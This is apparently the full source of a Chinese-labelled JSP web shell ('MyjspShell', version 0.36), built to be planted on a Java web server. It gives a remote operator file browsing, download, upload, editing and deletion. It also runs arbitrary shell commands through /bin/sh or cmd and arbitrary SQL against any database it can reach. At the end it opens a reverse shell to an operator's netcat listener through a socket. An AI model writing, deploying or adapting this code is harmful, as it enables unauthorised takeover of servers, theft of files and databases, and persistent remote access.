<%@page
        import="java.io.*,java.net.Socket,java.net.URLDecoder,java.net.URLEncoder,java.sql.*,java.text.DateFormat" pageEncoding="GBK" %>
...
<%!
    ...
    private static final int EDITFIELD_COLS = 95;
    ...
    //Button names
    private static final String SAVE_AS_ZIP = "&#19979;&#36733;&#20026;(z)ip";
    private static final String RENAME_FILE = "(R)&#37325;&#21629;&#21517;&#25991;&#20214;";
    private static final String DELETE_FILES = "(Del)&#21024;&#38500;&#25991;&#20214;";
    private static final String CREATE_DIR = "(D)&#21019;&#24314;&#25991;&#20214;&#22841;";
    private static final String CREATE_FILE = "(C)&#21019;&#24314;&#25991;&#20214;";
    private static final String MOVE_FILES = "(M)&#31227;&#21160;&#25991;&#20214;";
    private static final String COPY_FILES = "(y)&#22797;&#21046;&#25991;&#20214;";
    private static final String LAUNCH_COMMAND = "(L)&#36816;&#34892;&#21629;&#20196;";
    private static final String UPLOAD_FILES = "&#19978;&#20256;";
    private static final String DATABASE_MGR = "&#25968;&#25454;&#24211;&#31649;&#29702;";
    private static final String TASK_MGR = "&#36827;&#31243;&#31649;&#29702;";
    private static final String SERVICE_MGR = "&#26381;&#21153;&#31649;&#29702;";
    ...
    private static String VERSION_NR = "0.36";
...
//connection to the database
    ...
    class DBM {
        ...
        public void lookInfo() throws Exception {
            ...
            out.println("<p></p></hr>");
            out.println("<strong>DataBaseInfo</strong><table>");
            out.println("<tr><td>DataBaseName:</td><td>" + dbmd.getDatabaseProductName() + "</td></tr>");
            out.println("<tr><td>DataBaseVersion:</td><td>" + dbmd.getDatabaseProductVersion() + "</td></tr>");
            ...
            out.println("<tr><td>the System Function:</td><td>" + dbmd.getSystemFunctions() + "</td></tr>");
            out.println("</table>");
            ...
            //show  all the tables
            try {
                String[] types = {"TABLE", "VIEW"};// &#25968;&#32452;&#21464;&#37327;types
                rs = dbmd.getTables(null, null, null, types);
            } catch (Exception tabE) {
            }
            out.println("<strong>DataBase Tables Info</strong><br>");
            while (rs.next()) {
                tableType = rs.getString(4);
                out.println("<strong>TableName:</strong>" + "<a href=\"#\" onclick=\"getElementsByName('sqlcmd')[0].value='select * from " + rs.getString(3) + "'\">" + rs.getString(3) + "</a><br>");
                // if(tableType.indexOf("VIEW")>=0||tableType.indexOf("TABLE")>=0){//&#21435;&#38500;&#36807;&#22810;&#26080;&#29992;&#20449;&#24687;
                // try{
        ...
        private void getTableDetail(ResultSet tableRs) throws Exception {
            out.println("<table border=1><tr><td>COLUMN_NAME</td><td>DATA_TYPE</td><td>TYPE_NAME</td><td>COLUMN_SIZE</td><td>IS_NULLABLE</td><td>CHAR_OCTET_LENGTH</td></tr>");
            while (tableRs.next()) {
                out.println("<td>" + tableRs.getString(4) + "</td><td>" + tableRs.getInt(5) + "</td><td>" + tableRs.getString(6) + "</td><td>" + tableRs.getInt(7) + "</td><td>" + tableRs.getString(18) + "</td><td>" + tableRs.getInt(16) + "</td></tr>");
            }
            out.println("</table>");
            tableRs.close();
        }
        ...
        private void getProcedureDetail(ResultSet procRs) throws Exception {
            ...
            while (procRs.next()) {
                out.print("<tr><td>" + procRs.getString(3) + "</td><td>" + conv2Html(procRs.getString(7)) + "</td><td>" + procRs.getShort(8) + "</td></tr>");
            }
            out.print("</table>");
            procRs.close();
        }

        //run the sql command 2012 12 13
        public void executeSQL(String sqlCmd) throws SQLException {
            ...
            try {
                if (stmt.execute(sqlCmd)) { //
                    ...
                    do {
                        ...
                        out.println("<div style='padding:10px'><p><b>Query#0 : " + sqlCmd + "</b></p>");
                        out.println("<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"><tr class=\"head\">");
                        for (int i = 1; i <= ColumnCount; i++) {
                            out.print("<td>" + rsmd.getColumnName(i).toString() + "<br><span>" + rsmd.getColumnTypeName(i) + "</td>");
                        }
                        out.print("</tr>");
                        while (rs.next()) {
                            out.print("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
                            for (int i = 1; i <= ColumnCount; i++) {
                                ...
                                out.print("<td>" + conv2Html(rs.getString(i).toString()) + "</td>");
                ...
                } else out.println("OK===>>Update!!!......");
            } catch (Exception e) {
                System.out.println("Execute Sqlcmd Fail!!....");
            }
     ...
     */
    private static final String osdetect = "/bin/sh";
    private static final String osn = "-c";

    //private static final String[] COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
    private static final String[] COMMAND_INTERPRETER = {osdetect, osn}; // Unix
...
<%
    if (request.getParameter("Javascript") == null) {//2010.8.30 0:03
        String ost = ("Kernel");
...
<table width="90%">
    ...
    <tr>
        ...
        <td>
            Remote port:&nbsp;
            <strong><%=request.getRemotePort()%>
            </strong>
        </td>
        <td>
            Your Ip address:&nbsp;
            <strong><%=request.getRemoteAddr()%>
            </strong>
        </td>
    </tr>
    </tbody>
...
<table width="90%" border="1">
    ...
    <td>
        Os Name
        <br>
        <strong><%=System.getProperty("os.name")%>
        </strong>
    </td>
    <td><%=ost.toString()%><br>
        <strong><%=System.getProperty("os.version")%>
        </strong>
    </td>
    <td>
        Os architecture
        <br>
        <strong><%=System.getProperty("os.arch")%>
        </strong>
    </td>
    <td>
        Server
        <br>
        <strong><%=getServletConfig().getServletContext().getServerInfo()%>
        </strong>
    </td>
    <td>
        <strong><%=System.getProperty("java.vm.vendor")%>
        </strong>
        <strong><%=System.getProperty("java.vm.version")%>
        </strong>
...
<%
    ...
    request.setAttribute("dir", encodeChange(request.getParameter("dir")));//8.17&#26085;&#20462;&#25913;
    ...
    if (request.getParameter("Javascript") != null) {
        ...
        response.setHeader("Expires", sdf.format(new java.util.Date(now.getTime()
                + 1000 * 60 * 60 * 24 * 2)));
...
<%
    ...
    // View file
        ...
        File f = new File(encodeChange(request.getParameter("file")));
        if (!isAllowed(f, false)) {
            ...
            if (isPacked(f.getName(), false)) {
                ...
                if (mimeType.equals("text/plain"))
                    ...
                    response.setHeader("Content-Disposition",
                            "inline;filename=\"" + new String(f.getName().getBytes("GBK"), "ISO-8859-1") + "\"");
                BufferedInputStream fileInput = new BufferedInputStream(
                        new FileInputStream(f));
                byte buffer[] = new byte[8 * 1024];
                out.clearBuffer();
                //OutputStream out_s = new Writer2Stream(out);Bug 2010.8.18
    ...
    // Download selected files as zip file
        ...
        if (notAllowedFile != null) {
            ...
            ZipOutputStream zipout = new ZipOutputStream(
                    response.getOutputStream());//2010.8.18
            zipout.setComment("Created by Myjsp_spy v. "
                    + VERSION_NR);
    ...
    // Download file
        ...
        String filePath = encodeChange(request.getParameter("downfile"));
        ...
        if (!isAllowed(f, false)) {
            ...
            byte buffer[] = new byte[8 * 1024];
            out.clearBuffer();
            //OutputStream out_s = new Writer2Stream(out); &#21407;&#26469;&#30340;&#29256;&#26412;&#26377;bug&#65292;&#32534;&#30721;&#24773;&#20917;&#19979;&#25991;&#20214;&#25439;&#22351;
            OutputStream out_s = response.getOutputStream();
            copyStreamsWithoutClose(fileInput, out_s, buffer);
            fileInput.close();
            out_s.flush();
    ...
    if (request.getAttribute("dir") == null) {
        ...
        request.setAttribute("dir", encodeChange(path));
    }
%>
<table border="0">
    <tr>
        <td>
            <form action="<%=browser_name%>" method="POST">
                <input title="File Manager " class="button" type="Submit"
                       value="&#25991;&#20214;&#31649;&#29702;">
            </form>
        </td>
        <td>
            <form action="<%=browser_name%>" method="POST">
                <input title="Database Manager"
                       id="but_Db" class="button" type="Submit" name="Action"
                       value="<%=DATABASE_MGR %>">
            </form>
        </td>
        <td>
            <form action="<%=browser_name%>" method="POST">
                ...
                <input title="&#24403;&#21069;&#30446;&#24405;&#36816;&#34892;CMD" type="submit"
                       class="button" id="but_Lau2" name="Submit"
        ...
        <td>
            <form action="<%=browser_name%>" method="POST">
                <input title="Service Manager"
                       id="but_Srv" class="button" type="Submit" name="Action1"
                       value="<%=SERVICE_MGR %>">
            </form>
        </td>
        <td>
            <form action="<%=browser_name%>" method="POST">
                <input title="Database Manager"
                       id="but_Tsk" class="button" type="Submit" name="Action2"
                       value="<%=TASK_MGR %>">
            </form>
        </td>
...
<br>
<center>
    <table height="20px" width="90%" bgcolor="#Fee0FF"
           style="border: 1px solid #cccccc">
        <tr>
            <td bgcolor="black" width="<%=info.getPercent()%>%"></td>
...
<script>
    ...
    function setDataBase(f) {
        ...
        driverName[6] = "com.inet.tds.TdsDriver";
        conUrl = new Array();
        conUrl[0] = "jdbc:jtds:sybase://localhost:port/database";
        conUrl[1] = "jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master";
        conUrl[2] = "jdbc:mysql://localhost:3306/mysql";
        conUrl[3] = "jdbc:oracle:thin:@localhost:1521:database";
        conUrl[4] = "jdbc:db2://localhost:port/database";
        conUrl[5] = "jdbc:postgresql://localhost:port/database";
        conUrl[6] = "jdbc:inetdae://localhost:1433/master";
...
<body>
    <%
	String Driver,conURL,User,Pass,Sqlcmd,DBName;
Driver=request.getParameter("driver");conURL=request.getParameter("conUrl");
User=request.getParameter("user");Pass=request.getParameter("password");
Sqlcmd=request.getParameter("sqlcmd");DBName=request.getParameter("DB");

out.println("<table width=\"95%\" class=\"datatable\"  border=1>");
   out.println(" <form method=post name='form1' action='?Action=sql'>");
   out.println("<tr> <td width=\"15%\" ><div align=\"center\">&#25968;&#25454;&#24211;&#31867;&#22411;&#65306;</div></td>");
	out.println("<td width=\"56\">");
   out.println("   <p align=\"left\">Driver:      </p>      </td>");
out.println("<td width=\"488\"><input name=\"driver\" type=\"text\" size=\"70%\" value=\""+Driver+"\" /></td>");
	out.println("<td width=\"10%\"><div align=\"center\">&#29992;&#25143;&#21517;&#65306;</div></td>");
	out.println("<td width=\"140\"><div align=\"justify\">");
	out.println("  <input name=\"user\" type=text size=20 value=\""+User+"\" />");
	out.println("</div></td>");
   out.println(" <td width=\"44\" rowspan=\"2\"><button name=\"run\" type=\"submit\" value=\"LDB\" >&#36830;&#25509;</button></td>");
   out.println(" </tr>");
   out.println(" <tr>");
    out.println("  <td width=\"102\" >");
     out.println("   <select name=\"DB\" align=\"center\" onchange='setDataBase(this.form);' value=\""+DBName+"\">");
     out.println("<option>Sybase</option>");
     out.println("<option>Mssql</option>");
     out.println("<option>Mysql</option>");
     out.println("<option>Oracle</option>");
     out.println("<option>DB2</option>");
     out.println("<option>PostgreSQL</option>");
	 out.println("<option>MssQL TdsDriver</option>");
     out.println("</select>");
     out.println("</span></td>");
     out.println("<td><div align=\"left\">URL:&nbsp;&nbsp;&nbsp;</div></td>");
     out.println("<td><input name=\"conUrl\" type=\"text\" size=\"70%\" value=\""+conURL+"\" /></td>");
     out.println("<td width=\"10%\"><div align=\"center\">&#23494; &#30721; :</div></td>");
    out.println("<td width=\"140\"><input name=\"password\" type=\"text\" size=\"20\" value=\""+Pass+"\" /></td>");
    out.println("</tr>");
    out.println("<tr>");
     out.println("<td ><div align=\"center\">&#25191;&#34892;sql&#35821;&#21477;:   ");     
     out.println("</div></td>");
     out.println("<td colspan=\"4\" ><input name=\"sqlcmd\" type=\"text\" size=\"100%\" value=\""+Sqlcmd+"\"  /></td>");
      out.println("<td width=\"44\"><button name=\"run\" type=\"submit\" value=\"Exec\">&#25191;&#34892;</button></td>");
   out.println(" </tr> </form>");
out.println("</table>");
...
<center>
        ...
        <%
			out.println("<form action=\"" + browser_name
					...
					if (!request.getParameter("command").equalsIgnoreCase(""))
						ret = encodeChange(startProcess(request.getParameter("command"),
    ...
    <hr>
    <center>
        <small>MyjspShell <%=VERSION_NR%> by <a href="http://hi.baidu.com/"> SomeOne</a>
        </small>
    </center>
</center>
</body>
        ...
        while (entries.hasMoreElements()) {
            ...
            if (!entry.isDirectory()) {
                ...
                out.println("<tr class=\"mouseout\"><td>"
                        ...
                        + "%"
                        + "</td><td>"
                        + dateFormat.format(new java.util.Date(entry
                        .getTime())) + "</td></tr>");
...
<p align=center>
    ...
    <%
				...
				request.setAttribute("error", "&#35835;&#21462; "
						+ f.getName() + " &#32456;&#27490;. Error: " + ex);
			}
		}
	}
	// Upload
		...
		if (!ALLOW_UPLOAD) {
			request.setAttribute("error", "&#31105;&#27490;&#19978;&#20256;!");
		}
		...
		try {
			...
			if (!isAllowed(new File((String) ht.get("dir")), false)) {
				...
				if (info != null && info.aborted) {
					f.delete();
					request.setAttribute("error", "&#19978;&#20256;&#32456;&#27490;");
				} else {
	...
	// The form to edit a text file
		...
		File ef = new File(encodeChange(request.getParameter("editfile")));
...
%>
<title>Edit <%=conv2Html(encodeChange(request.getParameter("editfile")))%>
</title>
</head>
<body>
<center>
    <h2>
        Edit
        <%=conv2Html(encodeChange(request.getParameter("editfile")))%>
    </h2>
    <br/>
        <%
    ...
    <table class="formular">
        <input type="hidden" name="nfile"
               value="<%=encodeChange(request.getParameter("editfile"))%>">
        <input type="hidden" name="sort"
               value="<%=request.getParameter("sort")%>">
        <tr>
            <td colspan="2">
...
<hr>
	...
	// Save or cancel the edited file
		...
		if (request.getParameter("Submit").equals("Save")) {
			File new_f = new File(f.getParent(),request
	...
	//Unpack file to the current directory without overwriting
		...
		File f = new File(encodeChange(request.getParameter("unpackfile")));
			...
			try {
				...
				while (entries.hasMoreElements()) {
					...
					if (!entry.isDirectory()
						...
						request.setAttribute("error", "&#26080;&#27861;&#35299;&#21387;"
								+ f.getName() + ", File "
								+ entry.getName() + "&#24050;&#32463;&#23384;&#22312;&#12290;");
						error = true;
						break;
				...
				if (!error) {
					...
					zf.close();
					request.setAttribute("message", "&#35299;&#21387;"
							+ f.getName() + " &#25104;&#21151;");
				}
			} catch (ZipException ex) {
				request.setAttribute("error", "&#26080;&#27861;&#35299;&#21387; "
						+ f.getName() + ", &#19981;&#26159;&#26377;&#25928;&#30340;zip&#25991;&#20214;");
			} catch (IOException ex) {
				request.setAttribute("error", "&#35299;&#21387; "
						+ f.getName() + " &#32456;&#27490;&#12290;Error: " + ex);
			}
		}
	}
		...
		for (int i = v.size() - 1; i >= 0; i--) {
			...
			if (!f.canWrite() || !f.delete()) {
				request.setAttribute("error", "&#26080;&#27861;&#21024;&#38500; "
						+ f.getAbsolutePath() + "&#12290; &#21024;&#38500;&#32456;&#27490;");
				error = true;
				break;
			}
		}
		if ((!error) && (v.size() > 1))
			request.setAttribute("message", "&#25152;&#26377;&#25991;&#20214;&#21024;&#38500;&#23436;&#27605;");
		else if ((!error) && (v.size() > 0))
			request.setAttribute("message", "&#25991;&#20214;&#21024;&#38500;&#23436;&#27605;");
		else if (!error)
			request.setAttribute("error", "&#27809;&#36873;&#25321;&#25991;&#20214;");
	}
	// Create Directory
	else if ((request.getParameter("Submit") != null)
	...
	// Create a new empty file
		...
		// Test, if file_name is empty
			...
			if (new File(new_file).createNewFile())
				...
				request.setAttribute("error", "&#21019;&#24314;&#25991;&#20214; "
						+ new_file + " failed");
		} else
		...
		// 2b) If there are multiple files from the same directory, rename fails
			...
			// Test, if file_name is empty
				...
				if (!f.canWrite()
					...
					request.setAttribute("message", "&#37325;&#21629;&#21517;&#25991;&#20214; "
...
<%
    ...
    if (request.getParameter("sort") != null)
        sortMode = Integer.parseInt(request
                .getParameter("sort"));
    out.println(dir2linkdir((String) request.getAttribute("dir"), browser_name, sortMode));
%>
<form class="formular" action="<%=browser_name%>" method="Post"
    ...
    <!-- Here is begin of files and folders phasing -->
    <table id="filetable" class="filelist" cellspacing="1px"
        ...
        <%
            ...
            //out.print(request.getContentType() + f.getPath());
            ...
            if (entry != null && entry.length > 0) {
                ...
                for (int i = 0; i < entry.length; i++) {
                    ...
                    String date = dateFormat.format(new java.util.Date(entry[i]
                            .lastModified()));
                    out
    ...
    ---------------------------------------------------------------------------------------------------------------------
    <p align=center>
        <b title="<%=totalSize%> bytes"><%=convertFileSize(totalSize)%>
        </b><b>
    ...
    <input title="&#36873;&#20013;&#30340;&#25991;&#20214;&#21644;&#30446;&#24405;&#20316;&#20026;&#19968;&#20010;zip&#25991;&#20214;&#19979;&#36733;"
    ...
    <%
        if (!READ_ONLY) {
    %>
    <input title="&#21024;&#38500;&#25152;&#26377;&#36873;&#20013;&#30340;&#25991;&#20214;&#21644;&#30446;&#24405;&#65288;&#21253;&#25324;&#23376;&#30446;&#24405;&#65289;"
...
<!--End --- Form upload and Command run -->
<hr>
...
Usage:Run "netcat -l" on your local pc; Exec the JSP Reverse Shell; Go
Inside and Enjoy!&#29992;&#27861;&#65306;&#26412;&#26426;&#30452;&#25509;&#36816;&#34892; "nc -lp"+&#21453;&#24377;&#31471;&#21475;
<br>

<form method="post">
    IP Address (remote server)
    <input type="text" name="ipaddress"
           value=<% out.print(request.getRemoteAddr());%> size=30>
    Port (remote server)
    <input type="text" name="port" value="2190" size=10>

    <input type="submit" name="Go Inside!" value="Go Inside!"
           align="right">
</form>
<p>
<hr>
<center>
    <h3>
        MyJSPShell sOmeone &#27721;&#21270;&#29256; / Windows Linux version
    </h3>
</center>
...
<%
    ...
    if (ipAddress != null && ipPort != null) {
        ...
        try {
            ...
            sock = new Socket(ipAddress, (new Integer(ipPort))
                    .intValue());

            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(oss);
